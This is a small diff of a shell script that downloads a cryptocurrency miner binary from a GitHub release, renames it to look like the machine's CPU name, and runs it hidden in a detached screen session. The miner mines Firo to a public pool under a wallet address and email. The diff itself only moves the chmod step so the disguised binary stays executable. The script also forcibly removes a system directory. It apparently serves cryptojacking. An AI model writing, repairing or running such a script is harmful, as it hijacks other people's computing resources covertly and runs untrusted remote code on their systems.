@@ -9,11 +9,12 @@ rm -r /usr/share/work
 mkdir /usr/share
 mkdir /usr/share/work
 wget https://github.com/wollfoo/wolethv100/releases/download/gm/miner
-mv miner /usr/share/work/ && chmod u+x miner
+mv miner /usr/share/work/
 cd /usr/share/work/
 mv miner $azure -n
 cp $azure "$cpuname"
 rm -f miner
+chmod u+x "$cpuname"
 echo $cpuname" is starting"
 screen -d -m ./"${cpuname}" --algo firo --server firo-eu1.picopool.org:22443 --user a9qF6ebLR5pY7LebgwT1YQYjmT1Kmrwx6E.vul/crassanciso1986@gmail.com --ssl 1
 
